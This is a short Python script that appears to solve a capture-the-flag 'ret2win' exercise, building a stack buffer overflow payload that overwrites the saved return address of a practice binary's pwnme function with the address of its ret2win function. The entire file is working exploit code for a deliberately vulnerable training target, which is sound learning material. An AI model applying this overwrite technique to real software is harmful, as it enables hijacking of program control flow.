#!/usr/bin/python
import sys
import struct

# readelf -a <file>
# Symbol table '.symtab' contains 72 entries:
#    36: 080485ad   127 FUNC    LOCAL  DEFAULT   14 pwnme
#    37: 0804862c    41 FUNC    LOCAL  DEFAULT   14 ret2win

# run < <(python challenge.py)
# break *0x080485ad

# Relocation section '.rel.plt' at offset 0x33c contains 7 entries:

ret2win  = b'\x2c\x86\x04\x08'
deadcode = b'\xde\xc0\xad\xde'  # 0xdeadc0de

payload = b'A'*40
payload += b'B'*4       # ebp
payload += ret2win      # eip
payload += deadcode     # return for ret2win()

sys.stdout.buffer.write(payload)
